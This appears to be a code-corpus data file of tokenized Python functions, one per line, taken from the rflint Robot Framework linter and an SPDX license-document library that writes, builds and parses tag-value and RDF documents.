def run ( self , args ) : self . args = self . parse_and_process_args ( args ) if self . args . version : print ( __version__ ) return 0 if self . args . rulefile : for filename in self . args . rulefile : self . _load_rule_file ( filename ) if self . args . list : self . list_rules ( ) return 0 if self . args . describe : self . _describe_rules ( self . args . args ) return 0 self . counts = { ERROR : 0 , WARNING : 0 , "other" : 0 } for filename in self . args . args : if not ( os . path . exists ( filename ) ) : sys . stderr . write ( "rflint: %s: No such file or directory\n" % filename ) continue if os . path . isdir ( filename ) : self . _process_folder ( filename ) else : self . _process_file ( filename ) if self . counts [ ERROR ] > 0 : return self . counts [ ERROR ] if self . counts [ ERROR ] < 254 else 255 return 0
def list_rules ( self ) : for rule in sorted ( self . all_rules , key = lambda rule : rule . name ) : print ( rule ) if self . args . verbose : for line in rule . doc . split ( "\n" ) : print ( "    " , line )
def report ( self , linenumber , filename , severity , message , rulename , char ) : if self . _print_filename is not None : # we print the filename only once. self._print_filename # will get reset each time a new file is processed. print ( "+ " + self . _print_filename ) self . _print_filename = None if severity in ( WARNING , ERROR ) : self . counts [ severity ] += 1 else : self . counts [ "other" ] += 1 print ( self . args . format . format ( linenumber = linenumber , filename = filename , severity = severity , message = message . encode ( 'utf-8' ) , rulename = rulename , char = char ) )
def _load_rule_file ( self , filename ) : if not ( os . path . exists ( filename ) ) : sys . stderr . write ( "rflint: %s: No such file or directory\n" % filename ) return try : basename = os . path . basename ( filename ) ( name , ext ) = os . path . splitext ( basename ) imp . load_source ( name , filename ) except Exception as e : sys . stderr . write ( "rflint: %s: exception while loading: %s\n" % ( filename , str ( e ) ) )
def parse_and_process_args ( self , args ) : parser = argparse . ArgumentParser ( prog = "python -m rflint" , description = "A style checker for robot framework plain text files." , formatter_class = argparse . RawDescriptionHelpFormatter , epilog = ( "You can use 'all' in place of RULENAME to refer to all rules. \n" "\n" "For example: '--ignore all --warn DuplicateTestNames' will ignore all\n" "rules except DuplicateTestNames.\n" "\n" "FORMAT is a string that performs a substitution on the following \n" "patterns: {severity}, {linenumber}, {char}, {message}, and {rulename}.\n" "\n" "For example: --format 'line: {linenumber}: message: {message}'. \n" "\n" "ARGUMENTFILE is a filename with contents that match the format of \n" "standard robot framework argument files\n" "\n" "If you give a directory as an argument, all files in the directory\n" "with the suffix .txt, .robot or .tsv will be processed. With the \n" "--recursive option, subfolders within the directory will also be\n" "processed." ) ) parser . add_argument ( "--error" , "-e" , metavar = "RULENAME" , action = SetErrorAction , help = "Assign a severity of ERROR to the given RULENAME" ) parser . add_argument ( "--ignore" , "-i" , metavar = "RULENAME" , action = SetIgnoreAction , help = "Ignore the given RULENAME" ) parser . add_argument ( "--warning" , "-w" , metavar = "RULENAME" , action = SetWarningAction , help = "Assign a severity of WARNING for the given RULENAME" ) parser . add_argument ( "--list" , "-l" , action = "store_true" , help = "show a list of known rules and exit" ) parser . add_argument ( "--describe" , "-d" , action = "store_true" , help = "describe the given rules" ) parser . add_argument ( "--no-filenames" , action = "store_false" , dest = "print_filenames" , default = True , help = "suppress the printing of filenames" ) parser . add_argument ( "--format" , "-f" , help = "Define the output format" , default = '{severity}: {linenumber}, {char}: {message} ({rulename})' ) parser . add_argument ( "--version" , action = "store_true" , default = False , help = "Display version number and exit" ) parser . add_argument ( "--verbose" , "-v" , action = "store_true" , default = False , help = "Give verbose output" ) parser . add_argument ( "--configure" , "-c" , action = ConfigureAction , help = "Configure a rule" ) parser . add_argument ( "--recursive" , "-r" , action = "store_true" , default = False , help = "Recursively scan subfolders in a directory" ) parser . add_argument ( "--rulefile" , "-R" , action = RulefileAction , help = "import additional rules from the given RULEFILE" ) parser . add_argument ( "--argumentfile" , "-A" , action = ArgfileLoader , help = "read arguments from the given file" ) parser . add_argument ( 'args' , metavar = "file" , nargs = argparse . REMAINDER ) # create a custom namespace, in which we can store a reference to # our rules. This lets the custom argument actions access the list # of rules ns = argparse . Namespace ( ) setattr ( ns , "app" , self ) args = parser . parse_args ( args , ns ) Rule . output_format = args . format return args
def read_yaml_file ( path , loader = ExtendedSafeLoader ) : with open ( path ) as fh : return load ( fh , loader )
def f7 ( seq ) : seen = set ( ) seen_add = seen . add return [ x for x in seq if x not in seen and not seen_add ( x ) ]
def count_list ( the_list ) : count = the_list . count result = [ ( item , count ( item ) ) for item in set ( the_list ) ] result . sort ( ) return result
def write_creation_info ( creation_info , out ) : out . write ( '# Creation Info\n\n' ) # Write sorted creators for creator in sorted ( creation_info . creators ) : write_value ( 'Creator' , creator , out ) # write created write_value ( 'Created' , creation_info . created_iso_format , out ) # possible comment if creation_info . has_comment : write_text_value ( 'CreatorComment' , creation_info . comment , out )
def write_review ( review , out ) : out . write ( '# Review\n\n' ) write_value ( 'Reviewer' , review . reviewer , out ) write_value ( 'ReviewDate' , review . review_date_iso_format , out ) if review . has_comment : write_text_value ( 'ReviewComment' , review . comment , out )
def write_annotation ( annotation , out ) : out . write ( '# Annotation\n\n' ) write_value ( 'Annotator' , annotation . annotator , out ) write_value ( 'AnnotationDate' , annotation . annotation_date_iso_format , out ) if annotation . has_comment : write_text_value ( 'AnnotationComment' , annotation . comment , out ) write_value ( 'AnnotationType' , annotation . annotation_type , out ) write_value ( 'SPDXREF' , annotation . spdx_id , out )
def write_file ( spdx_file , out ) : out . write ( '# File\n\n' ) write_value ( 'FileName' , spdx_file . name , out ) write_value ( 'SPDXID' , spdx_file . spdx_id , out ) if spdx_file . has_optional_field ( 'type' ) : write_file_type ( spdx_file . type , out ) write_value ( 'FileChecksum' , spdx_file . chk_sum . to_tv ( ) , out ) if isinstance ( spdx_file . conc_lics , ( document . LicenseConjunction , document . LicenseDisjunction ) ) : write_value ( 'LicenseConcluded' , u'({0})' . format ( spdx_file . conc_lics ) , out ) else : write_value ( 'LicenseConcluded' , spdx_file . conc_lics , out ) # write sorted list for lics in sorted ( spdx_file . licenses_in_file ) : write_value ( 'LicenseInfoInFile' , lics , out ) if isinstance ( spdx_file . copyright , six . string_types ) : write_text_value ( 'FileCopyrightText' , spdx_file . copyright , out ) else : write_value ( 'FileCopyrightText' , spdx_file . copyright , out ) if spdx_file . has_optional_field ( 'license_comment' ) : write_text_value ( 'LicenseComments' , spdx_file . license_comment , out ) if spdx_file . has_optional_field ( 'comment' ) : write_text_value ( 'FileComment' , spdx_file . comment , out ) if spdx_file . has_optional_field ( 'notice' ) : write_text_value ( 'FileNotice' , spdx_file . notice , out ) for contributor in sorted ( spdx_file . contributors ) : write_value ( 'FileContributor' , contributor , out ) for dependency in sorted ( spdx_file . dependencies ) : write_value ( 'FileDependency' , dependency , out ) names = spdx_file . artifact_of_project_name homepages = spdx_file . artifact_of_project_home uris = spdx_file . artifact_of_project_uri for name , homepage , uri in sorted ( zip_longest ( names , homepages , uris ) ) : write_value ( 'ArtifactOfProjectName' , name , out ) if homepage is not None : write_value ( 'ArtifactOfProjectHomePage' , homepage , out ) if uri is not None : write_value ( 'ArtifactOfProjectURI' , uri , out )
def write_package ( package , out ) : out . write ( '# Package\n\n' ) write_value ( 'PackageName' , package . name , out ) if package . has_optional_field ( 'version' ) : write_value ( 'PackageVersion' , package . version , out ) write_value ( 'PackageDownloadLocation' , package . download_location , out ) if package . has_optional_field ( 'summary' ) : write_text_value ( 'PackageSummary' , package . summary , out ) if package . has_optional_field ( 'source_info' ) : write_text_value ( 'PackageSourceInfo' , package . source_info , out ) if package . has_optional_field ( 'file_name' ) : write_value ( 'PackageFileName' , package . file_name , out ) if package . has_optional_field ( 'supplier' ) : write_value ( 'PackageSupplier' , package . supplier , out ) if package . has_optional_field ( 'originator' ) : write_value ( 'PackageOriginator' , package . originator , out ) if package . has_optional_field ( 'check_sum' ) : write_value ( 'PackageChecksum' , package . check_sum . to_tv ( ) , out ) write_value ( 'PackageVerificationCode' , format_verif_code ( package ) , out ) if package . has_optional_field ( 'description' ) : write_text_value ( 'PackageDescription' , package . description , out ) if isinstance ( package . license_declared , ( document . LicenseConjunction , document . LicenseDisjunction ) ) : write_value ( 'PackageLicenseDeclared' , u'({0})' . format ( package . license_declared ) , out ) else : write_value ( 'PackageLicenseDeclared' , package . license_declared , out ) if isinstance ( package . conc_lics , ( document . LicenseConjunction , document . LicenseDisjunction ) ) : write_value ( 'PackageLicenseConcluded' , u'({0})' . format ( package . conc_lics ) , out ) else : write_value ( 'PackageLicenseConcluded' , package . conc_lics , out ) # Write sorted list of licenses. for lics in sorted ( package . licenses_from_files ) : write_value ( 'PackageLicenseInfoFromFiles' , lics , out ) if package . has_optional_field ( 'license_comment' ) : write_text_value ( 'PackageLicenseComments' , package . license_comment , out ) # cr_text is either free form text or NONE or NOASSERTION. if isinstance ( package . cr_text , six . string_types ) : write_text_value ( 'PackageCopyrightText' , package . cr_text , out ) else : write_value ( 'PackageCopyrightText' , package . cr_text , out ) if package . has_optional_field ( 'homepage' ) : write_value ( 'PackageHomePage' , package . homepage , out ) # Write sorted files. for spdx_file in sorted ( package . files ) : write_separators ( out ) write_file ( spdx_file , out )
def write_extracted_licenses ( lics , out ) : write_value ( 'LicenseID' , lics . identifier , out ) if lics . full_name is not None : write_value ( 'LicenseName' , lics . full_name , out ) if lics . comment is not None : write_text_value ( 'LicenseComment' , lics . comment , out ) for xref in sorted ( lics . cross_ref ) : write_value ( 'LicenseCrossReference' , xref , out ) write_text_value ( 'ExtractedText' , lics . text , out )
def str_from_text ( text ) : REGEX = re . compile ( '<text>((.|\n)+)</text>' , re . UNICODE ) match = REGEX . match ( text ) if match : return match . group ( 1 ) else : return None
def reset_document ( self ) : # FIXME: this state does not make sense self . doc_version_set = False self . doc_comment_set = False self . doc_namespace_set = False self . doc_data_lics_set = False self . doc_name_set = False self . doc_spdx_id_set = False
def reset_creation_info ( self ) : # FIXME: this state does not make sense self . created_date_set = False self . creation_comment_set = False self . lics_list_ver_set = False
def reset_annotations ( self ) : # FIXME: this state does not make sense self . annotation_date_set = False self . annotation_comment_set = False self . annotation_type_set = False self . annotation_spdx_id_set = False
def reset_package ( self ) : # FIXME: this state does not make sense self . package_set = False self . package_vers_set = False self . package_file_name_set = False self . package_supplier_set = False self . package_originator_set = False self . package_down_location_set = False self . package_home_set = False self . package_verif_set = False self . package_chk_sum_set = False self . package_source_info_set = False self . package_conc_lics_set = False self . package_license_declared_set = False self . package_license_comment_set = False self . package_cr_text_set = False self . package_summary_set = False self . package_desc_set = False
def set_file_name ( self , doc , name ) : if self . has_package ( doc ) : doc . package . files . append ( file . File ( name ) ) # A file name marks the start of a new file instance. # The builder must be reset # FIXME: this state does not make sense self . reset_file_stat ( ) return True else : raise OrderError ( 'File::Name' )
def add_file_contribution ( self , doc , value ) : if self . has_package ( doc ) and self . has_file ( doc ) : self . file ( doc ) . add_contrib ( value ) else : raise OrderError ( 'File::Contributor' )
def add_file_dep ( self , doc , value ) : if self . has_package ( doc ) and self . has_file ( doc ) : self . file ( doc ) . add_depend ( value ) else : raise OrderError ( 'File::Dependency' )
def reset_file_stat ( self ) : # FIXME: this state does not make sense self . file_spdx_id_set = False self . file_comment_set = False self . file_type_set = False self . file_chksum_set = False self . file_conc_lics_set = False self . file_license_comment_set = False self . file_notice_set = False self . file_copytext_set = False
def datetime_iso_format ( date ) : return "{0:0>4}-{1:0>2}-{2:0>2}T{3:0>2}:{4:0>2}:{5:0>2}Z" . format ( date . year , date . month , date . day , date . hour , date . minute , date . second )
def build ( self , * * kwargs ) : self . yacc = yacc . yacc ( module = self , * * kwargs )
def parse ( self , data ) : try : return self . yacc . parse ( data , lexer = self . lex ) except : return None
def create_checksum_node ( self , chksum ) : chksum_node = BNode ( ) type_triple = ( chksum_node , RDF . type , self . spdx_namespace . Checksum ) self . graph . add ( type_triple ) algorithm_triple = ( chksum_node , self . spdx_namespace . algorithm , Literal ( chksum . identifier ) ) self . graph . add ( algorithm_triple ) value_triple = ( chksum_node , self . spdx_namespace . checksumValue , Literal ( chksum . value ) ) self . graph . add ( value_triple ) return chksum_node
def to_special_value ( self , value ) : if isinstance ( value , utils . NoAssert ) : return self . spdx_namespace . noassertion elif isinstance ( value , utils . SPDXNone ) : return self . spdx_namespace . none else : return Literal ( value )
def create_conjunction_node ( self , conjunction ) : node = BNode ( ) type_triple = ( node , RDF . type , self . spdx_namespace . ConjunctiveLicenseSet ) self . graph . add ( type_triple ) licenses = self . licenses_from_tree ( conjunction ) for lic in licenses : member_triple = ( node , self . spdx_namespace . member , lic ) self . graph . add ( member_triple ) return node
def create_disjunction_node ( self , disjunction ) : node = BNode ( ) type_triple = ( node , RDF . type , self . spdx_namespace . DisjunctiveLicenseSet ) self . graph . add ( type_triple ) licenses = self . licenses_from_tree ( disjunction ) for lic in licenses : member_triple = ( node , self . spdx_namespace . member , lic ) self . graph . add ( member_triple ) return node
def create_file_node ( self , doc_file ) : file_node = URIRef ( 'http://www.spdx.org/files#{id}' . format ( id = str ( doc_file . spdx_id ) ) ) type_triple = ( file_node , RDF . type , self . spdx_namespace . File ) self . graph . add ( type_triple ) name_triple = ( file_node , self . spdx_namespace . fileName , Literal ( doc_file . name ) ) self . graph . add ( name_triple ) if doc_file . has_optional_field ( 'comment' ) : comment_triple = ( file_node , RDFS . comment , Literal ( doc_file . comment ) ) self . graph . add ( comment_triple ) if doc_file . has_optional_field ( 'type' ) : ftype = self . spdx_namespace [ self . FILE_TYPES [ doc_file . type ] ] ftype_triple = ( file_node , self . spdx_namespace . fileType , ftype ) self . graph . add ( ftype_triple ) self . graph . add ( ( file_node , self . spdx_namespace . checksum , self . create_checksum_node ( doc_file . chk_sum ) ) ) conc_lic_node = self . license_or_special ( doc_file . conc_lics ) conc_lic_triple = ( file_node , self . spdx_namespace . licenseConcluded , conc_lic_node ) self . graph . add ( conc_lic_triple ) license_info_nodes = map ( self . license_or_special , doc_file . licenses_in_file ) for lic in license_info_nodes : triple = ( file_node , self . spdx_namespace . licenseInfoInFile , lic ) self . graph . add ( triple ) if doc_file . has_optional_field ( 'license_comment' ) : comment_triple = ( file_node , self . spdx_namespace . licenseComments , Literal ( doc_file . license_comment ) ) self . graph . add ( comment_triple ) cr_text_node = self . to_special_value ( doc_file . copyright ) cr_text_triple = ( file_node , self . spdx_namespace . copyrightText , cr_text_node ) self . graph . add ( cr_text_triple ) if doc_file . has_optional_field ( 'notice' ) : notice_triple = ( file_node , self . spdx_namespace . noticeText , doc_file . notice ) self . graph . add ( notice_triple ) contrib_nodes = map ( lambda c : Literal ( c ) , doc_file . contributors ) contrib_triples = [ ( file_node , self . spdx_namespace . fileContributor , node ) for node in contrib_nodes ] for triple in contrib_triples : self . graph . add ( triple ) return file_node
def create_review_node ( self , review ) : review_node = BNode ( ) type_triple = ( review_node , RDF . type , self . spdx_namespace . Review ) self . graph . add ( type_triple ) reviewer_node = Literal ( review . reviewer . to_value ( ) ) self . graph . add ( ( review_node , self . spdx_namespace . reviewer , reviewer_node ) ) reviewed_date_node = Literal ( review . review_date_iso_format ) reviewed_triple = ( review_node , self . spdx_namespace . reviewDate , reviewed_date_node ) self . graph . add ( reviewed_triple ) if review . has_comment : comment_node = Literal ( review . comment ) comment_triple = ( review_node , RDFS . comment , comment_node ) self . graph . add ( comment_triple ) return review_node
def create_annotation_node ( self , annotation ) : annotation_node = URIRef ( str ( annotation . spdx_id ) ) type_triple = ( annotation_node , RDF . type , self . spdx_namespace . Annotation ) self . graph . add ( type_triple ) annotator_node = Literal ( annotation . annotator . to_value ( ) ) self . graph . add ( ( annotation_node , self . spdx_namespace . annotator , annotator_node ) ) annotation_date_node = Literal ( annotation . annotation_date_iso_format ) annotation_triple = ( annotation_node , self . spdx_namespace . annotationDate , annotation_date_node ) self . graph . add ( annotation_triple ) if annotation . has_comment : comment_node = Literal ( annotation . comment ) comment_triple = ( annotation_node , RDFS . comment , comment_node ) self . graph . add ( comment_triple ) annotation_type_node = Literal ( annotation . annotation_type ) annotation_type_triple = ( annotation_node , self . spdx_namespace . annotationType , annotation_type_node ) self . graph . add ( annotation_type_triple ) return annotation_node
def create_creation_info ( self ) : ci_node = BNode ( ) # Type property type_triple = ( ci_node , RDF . type , self . spdx_namespace . CreationInfo ) self . graph . add ( type_triple ) created_date = Literal ( self . document . creation_info . created_iso_format ) created_triple = ( ci_node , self . spdx_namespace . created , created_date ) self . graph . add ( created_triple ) creators = self . creators ( ) for creator in creators : self . graph . add ( ( ci_node , self . spdx_namespace . creator , creator ) ) if self . document . creation_info . has_comment : comment_node = Literal ( self . document . creation_info . comment ) comment_triple = ( ci_node , RDFS . comment , comment_node ) self . graph . add ( comment_triple ) return ci_node
def create_external_document_ref_node ( self , ext_document_references ) : ext_doc_ref_node = BNode ( ) type_triple = ( ext_doc_ref_node , RDF . type , self . spdx_namespace . ExternalDocumentRef ) self . graph . add ( type_triple ) ext_doc_id = Literal ( ext_document_references . external_document_id ) ext_doc_id_triple = ( ext_doc_ref_node , self . spdx_namespace . externalDocumentId , ext_doc_id ) self . graph . add ( ext_doc_id_triple ) doc_uri = Literal ( ext_document_references . spdx_document_uri ) doc_uri_triple = ( ext_doc_ref_node , self . spdx_namespace . spdxDocument , doc_uri ) self . graph . add ( doc_uri_triple ) checksum_node = self . create_checksum_node ( ext_document_references . check_sum ) self . graph . add ( ( ext_doc_ref_node , self . spdx_namespace . checksum , checksum_node ) ) return ext_doc_ref_node
def package_verif_node ( self , package ) : verif_node = BNode ( ) type_triple = ( verif_node , RDF . type , self . spdx_namespace . PackageVerificationCode ) self . graph . add ( type_triple ) value_triple = ( verif_node , self . spdx_namespace . packageVerificationCodeValue , Literal ( package . verif_code ) ) self . graph . add ( value_triple ) excl_file_nodes = map ( lambda excl : Literal ( excl ) , package . verif_exc_files ) excl_predicate = self . spdx_namespace . packageVerificationCodeExcludedFile excl_file_triples = [ ( verif_node , excl_predicate , xcl_file ) for xcl_file in excl_file_nodes ] for trp in excl_file_triples : self . graph . add ( trp ) return verif_node
def handle_pkg_optional_fields ( self , package , package_node ) : self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . versionInfo , 'version' ) self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . packageFileName , 'file_name' ) self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . supplier , 'supplier' ) self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . originator , 'originator' ) self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . sourceInfo , 'source_info' ) self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . licenseComments , 'license_comment' ) self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . summary , 'summary' ) self . handle_package_literal_optional ( package , package_node , self . spdx_namespace . description , 'description' ) if package . has_optional_field ( 'check_sum' ) : checksum_node = self . create_checksum_node ( package . check_sum ) self . graph . add ( ( package_node , self . spdx_namespace . checksum , checksum_node ) ) if package . has_optional_field ( 'homepage' ) : homepage_node = URIRef ( self . to_special_value ( package . homepage ) ) homepage_triple = ( package_node , self . doap_namespace . homepage , homepage_node ) self . graph . add ( homepage_triple )
def create_doc ( self ) : doc_node = URIRef ( 'http://www.spdx.org/tools#SPDXRef-DOCUMENT' ) # Doc type self . graph . add ( ( doc_node , RDF . type , self . spdx_namespace . SpdxDocument ) ) # Version vers_literal = Literal ( str ( self . document . version ) ) self . graph . add ( ( doc_node , self . spdx_namespace . specVersion , vers_literal ) ) # Data license data_lics = URIRef ( self . document . data_license . url ) self . graph . add ( ( doc_node , self . spdx_namespace . dataLicense , data_lics ) ) doc_name = URIRef ( self . document . name ) self . graph . add ( ( doc_node , self . spdx_namespace . name , doc_name ) ) return doc_node
def handle_lics ( self , lics ) : # Handle extracted licensing info type. if ( lics , RDF . type , self . spdx_namespace [ 'ExtractedLicensingInfo' ] ) in self . graph : return self . parse_only_extr_license ( lics ) # Assume resource, hence the path separator ident_start = lics . rfind ( '/' ) + 1 if ident_start == 0 : # special values such as spdx:noassertion special = self . to_special_value ( lics ) if special == lics : if self . LICS_REF_REGEX . match ( lics ) : # Is a license ref i.e LicenseRef-1 return document . License . from_identifier ( lics ) else : # Not a known license form raise SPDXValueError ( 'License' ) else : # is a special value return special else : # license url return document . License . from_identifier ( lics [ ident_start : ] )
def get_extr_license_ident ( self , extr_lic ) : identifier_tripples = list ( self . graph . triples ( ( extr_lic , self . spdx_namespace [ 'licenseId' ] , None ) ) ) if not identifier_tripples : self . error = True msg = 'Extracted license must have licenseId property.' self . logger . log ( msg ) return if len ( identifier_tripples ) > 1 : self . more_than_one_error ( 'extracted license identifier_tripples' ) return identifier_tripple = identifier_tripples [ 0 ] _s , _p , identifier = identifier_tripple return identifier
def get_extr_license_text ( self , extr_lic ) : text_tripples = list ( self . graph . triples ( ( extr_lic , self . spdx_namespace [ 'extractedText' ] , None ) ) ) if not text_tripples : self . error = True msg = 'Extracted license must have extractedText property' self . logger . log ( msg ) return if len ( text_tripples ) > 1 : self . more_than_one_error ( 'extracted license text' ) return text_tripple = text_tripples [ 0 ] _s , _p , text = text_tripple return text
def get_extr_lic_name ( self , extr_lic ) : extr_name_list = list ( self . graph . triples ( ( extr_lic , self . spdx_namespace [ 'licenseName' ] , None ) ) ) if len ( extr_name_list ) > 1 : self . more_than_one_error ( 'extracted license name' ) return elif len ( extr_name_list ) == 0 : return return self . to_special_value ( extr_name_list [ 0 ] [ 2 ] )
def get_extr_lics_xref ( self , extr_lic ) : xrefs = list ( self . graph . triples ( ( extr_lic , RDFS . seeAlso , None ) ) ) return map ( lambda xref_triple : xref_triple [ 2 ] , xrefs )
def get_extr_lics_comment ( self , extr_lics ) : comment_list = list ( self . graph . triples ( ( extr_lics , RDFS . comment , None ) ) ) if len ( comment_list ) > 1 : self . more_than_one_error ( 'extracted license comment' ) return elif len ( comment_list ) == 1 : return comment_list [ 0 ] [ 2 ] else : return
def parse_package ( self , p_term ) : # Check there is a pacakge name if not ( p_term , self . spdx_namespace [ 'name' ] , None ) in self . graph : self . error = True self . logger . log ( 'Package must have a name.' ) # Create dummy package so that we may continue parsing the rest of # the package fields. self . builder . create_package ( self . doc , 'dummy_package' ) else : for _s , _p , o in self . graph . triples ( ( p_term , self . spdx_namespace [ 'name' ] , None ) ) : try : self . builder . create_package ( self . doc , six . text_type ( o ) ) except CardinalityError : self . more_than_one_error ( 'Package name' ) break self . p_pkg_vinfo ( p_term , self . spdx_namespace [ 'versionInfo' ] ) self . p_pkg_fname ( p_term , self . spdx_namespace [ 'packageFileName' ] ) self . p_pkg_suppl ( p_term , self . spdx_namespace [ 'supplier' ] ) self . p_pkg_originator ( p_term , self . spdx_namespace [ 'originator' ] ) self . p_pkg_down_loc ( p_term , self . spdx_namespace [ 'downloadLocation' ] ) self . p_pkg_homepg ( p_term , self . doap_namespace [ 'homepage' ] ) self . p_pkg_chk_sum ( p_term , self . spdx_namespace [ 'checksum' ] ) self . p_pkg_src_info ( p_term , self . spdx_namespace [ 'sourceInfo' ] ) self . p_pkg_verif_code ( p_term , self . spdx_namespace [ 'packageVerificationCode' ] ) self . p_pkg_lic_conc ( p_term , self . spdx_namespace [ 'licenseConcluded' ] ) self . p_pkg_lic_decl ( p_term , self . spdx_namespace [ 'licenseDeclared' ] ) self . p_pkg_lics_info_from_files ( p_term , self . spdx_namespace [ 'licenseInfoFromFiles' ] ) self . p_pkg_comments_on_lics ( p_term , self . spdx_namespace [ 'licenseComments' ] ) self . p_pkg_cr_text ( p_term , self . spdx_namespace [ 'copyrightText' ] ) self . p_pkg_summary ( p_term , self . spdx_namespace [ 'summary' ] ) self . p_pkg_descr ( p_term , self . spdx_namespace [ 'description' ] )
def handle_pkg_lic ( self , p_term , predicate , builder_func ) : try : for _ , _ , licenses in self . graph . triples ( ( p_term , predicate , None ) ) : if ( licenses , RDF . type , self . spdx_namespace [ 'ConjunctiveLicenseSet' ] ) in self . graph : lics = self . handle_conjunctive_list ( licenses ) builder_func ( self . doc , lics ) elif ( licenses , RDF . type , self . spdx_namespace [ 'DisjunctiveLicenseSet' ] ) in self . graph : lics = self . handle_disjunctive_list ( licenses ) builder_func ( self . doc , lics ) else : try : lics = self . handle_lics ( licenses ) builder_func ( self . doc , lics ) except SPDXValueError : self . value_error ( 'PKG_SINGLE_LICS' , licenses ) except CardinalityError : self . more_than_one_error ( 'package {0}' . format ( predicate ) )
def get_file_name ( self , f_term ) : for _ , _ , name in self . graph . triples ( ( f_term , self . spdx_namespace [ 'fileName' ] , None ) ) : return name return
def p_file_depends ( self , f_term , predicate ) : for _ , _ , other_file in self . graph . triples ( ( f_term , predicate , None ) ) : name = self . get_file_name ( other_file ) if name is not None : self . builder . add_file_dep ( six . text_type ( name ) ) else : self . error = True msg = 'File depends on file with no name' self . logger . log ( msg )
def p_file_contributor ( self , f_term , predicate ) : for _ , _ , contributor in self . graph . triples ( ( f_term , predicate , None ) ) : self . builder . add_file_contribution ( self . doc , six . text_type ( contributor ) )
def p_file_notice ( self , f_term , predicate ) : try : for _ , _ , notice in self . graph . triples ( ( f_term , predicate , None ) ) : self . builder . set_file_notice ( self . doc , six . text_type ( notice ) ) except CardinalityError : self . more_than_one_error ( 'file notice' )
def p_file_comment ( self , f_term , predicate ) : try : for _ , _ , comment in self . graph . triples ( ( f_term , predicate , None ) ) : self . builder . set_file_comment ( self . doc , six . text_type ( comment ) ) except CardinalityError : self . more_than_one_error ( 'file comment' )
def p_file_cr_text ( self , f_term , predicate ) : try : for _ , _ , cr_text in self . graph . triples ( ( f_term , predicate , None ) ) : self . builder . set_file_copyright ( self . doc , six . text_type ( cr_text ) ) except CardinalityError : self . more_than_one_error ( 'file copyright text' )
def p_file_comments_on_lics ( self , f_term , predicate ) : try : for _ , _ , comment in self . graph . triples ( ( f_term , predicate , None ) ) : self . builder . set_file_license_comment ( self . doc , six . text_type ( comment ) ) except CardinalityError : self . more_than_one_error ( 'file comments on license' )
def p_file_lic_info ( self , f_term , predicate ) : for _ , _ , info in self . graph . triples ( ( f_term , predicate , None ) ) : lic = self . handle_lics ( info ) if lic is not None : self . builder . set_file_license_in_file ( self . doc , lic )
def p_file_type ( self , f_term , predicate ) : try : for _ , _ , ftype in self . graph . triples ( ( f_term , predicate , None ) ) : try : if ftype . endswith ( 'binary' ) : ftype = 'BINARY' elif ftype . endswith ( 'source' ) : ftype = 'SOURCE' elif ftype . endswith ( 'other' ) : ftype = 'OTHER' elif ftype . endswith ( 'archive' ) : ftype = 'ARCHIVE' self . builder . set_file_type ( self . doc , ftype ) except SPDXValueError : self . value_error ( 'FILE_TYPE' , ftype ) except CardinalityError : self . more_than_one_error ( 'file type' )
def p_file_chk_sum ( self , f_term , predicate ) : try : for _s , _p , checksum in self . graph . triples ( ( f_term , predicate , None ) ) : for _ , _ , value in self . graph . triples ( ( checksum , self . spdx_namespace [ 'checksumValue' ] , None ) ) : self . builder . set_file_chksum ( self . doc , six . text_type ( value ) ) except CardinalityError : self . more_than_one_error ( 'File checksum' )
def p_file_lic_conc ( self , f_term , predicate ) : try : for _ , _ , licenses in self . graph . triples ( ( f_term , predicate , None ) ) : if ( licenses , RDF . type , self . spdx_namespace [ 'ConjunctiveLicenseSet' ] ) in self . graph : lics = self . handle_conjunctive_list ( licenses ) self . builder . set_concluded_license ( self . doc , lics ) elif ( licenses , RDF . type , self . spdx_namespace [ 'DisjunctiveLicenseSet' ] ) in self . graph : lics = self . handle_disjunctive_list ( licenses ) self . builder . set_concluded_license ( self . doc , lics ) else : try : lics = self . handle_lics ( licenses ) self . builder . set_concluded_license ( self . doc , lics ) except SPDXValueError : self . value_error ( 'FILE_SINGLE_LICS' , licenses ) except CardinalityError : self . more_than_one_error ( 'file {0}' . format ( predicate ) )
def parse_creation_info ( self , ci_term ) : for _s , _p , o in self . graph . triples ( ( ci_term , self . spdx_namespace [ 'creator' ] , None ) ) : try : ent = self . builder . create_entity ( self . doc , six . text_type ( o ) ) self . builder . add_creator ( self . doc , ent ) except SPDXValueError : self . value_error ( 'CREATOR_VALUE' , o ) for _s , _p , o in self . graph . triples ( ( ci_term , self . spdx_namespace [ 'created' ] , None ) ) : try : self . builder . set_created_date ( self . doc , six . text_type ( o ) ) except SPDXValueError : self . value_error ( 'CREATED_VALUE' , o ) except CardinalityError : self . more_than_one_error ( 'created' ) break for _s , _p , o in self . graph . triples ( ( ci_term , RDFS . comment , None ) ) : try : self . builder . set_creation_comment ( self . doc , six . text_type ( o ) ) except CardinalityError : self . more_than_one_error ( 'CreationInfo comment' ) break for _s , _p , o in self . graph . triples ( ( ci_term , self . spdx_namespace [ 'licenseListVersion' ] , None ) ) : try : self . builder . set_lics_list_ver ( self . doc , six . text_type ( o ) ) except CardinalityError : self . more_than_one_error ( 'licenseListVersion' ) break except SPDXValueError : self . value_error ( 'LL_VALUE' , o )
def parse_ext_doc_ref ( self , ext_doc_ref_term ) : for _s , _p , o in self . graph . triples ( ( ext_doc_ref_term , self . spdx_namespace [ 'externalDocumentId' ] , None ) ) : try : self . builder . set_ext_doc_id ( self . doc , six . text_type ( o ) ) except SPDXValueError : self . value_error ( 'EXT_DOC_REF_VALUE' , 'External Document ID' ) break for _s , _p , o in self . graph . triples ( ( ext_doc_ref_term , self . spdx_namespace [ 'spdxDocument' ] , None ) ) : try : self . builder . set_spdx_doc_uri ( self . doc , six . text_type ( o ) ) except SPDXValueError : self . value_error ( 'EXT_DOC_REF_VALUE' , 'SPDX Document URI' ) break for _s , _p , checksum in self . graph . triples ( ( ext_doc_ref_term , self . spdx_namespace [ 'checksum' ] , None ) ) : for _ , _ , value in self . graph . triples ( ( checksum , self . spdx_namespace [ 'checksumValue' ] , None ) ) : try : self . builder . set_chksum ( self . doc , six . text_type ( value ) ) except SPDXValueError : self . value_error ( 'EXT_DOC_REF_VALUE' , 'Checksum' ) break
